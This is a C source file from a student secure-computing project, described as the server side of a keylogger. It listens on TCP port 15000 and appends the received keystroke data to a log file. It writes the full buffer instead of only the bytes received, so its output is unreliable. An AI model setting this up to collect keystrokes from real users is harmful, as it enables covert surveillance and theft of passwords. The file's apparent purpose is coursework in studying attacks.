//********************************************************************
//
// Stanley Razumov
// Introduction to Secure Computing
// Final Programming Project: Obtaining User Input Using a Keylogger (Server Side)
// December 3, 2019
// Instructor: Dr. Ajay K. Katangur
//
//********************************************************************
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PORT 15000
#define SIZE 1024
//********************************************************************
//
// Main Function
//
// This function performs setup of the socket/connection and 
// reads from the socket and writes to a file
//
// Return Value
// ------------
// int                          0 for success
//
// Local Variables
// ---------------
// servaddr		        sockaddr_in		Server configuration for incoming connections
// serversockfd	        int		        Server socket descriptor
// connfd               int             Current connection descriptor
// recv_return_code     int		        Holds the current byte recv() is recieving
//
//*******************************************************************
int main(){
    struct sockaddr_in servaddr;
    char buff[SIZE + 1];
    int serversockfd, connfd, recv_return_code;
    // Set up the socket
    serversockfd = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    bzero(buff, sizeof(buff));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);

    bind(serversockfd, (struct sockaddr*)&servaddr, sizeof(servaddr));
    listen(serversockfd, 1);
    
    for(;;){
        // Accept incoming connection and assign it to connfd
        connfd = accept(serversockfd, (struct sockaddr*)NULL, NULL);
        FILE* logfile = fopen( "log.txt", "ab+");
        // Recieve and write to the log file
        while((recv_return_code = recv(connfd, buff, SIZE,0)) > 0 ) {
                fwrite(buff, 1, sizeof(buff), logfile);
        }
        close(connfd);
        fclose(logfile);
    }
}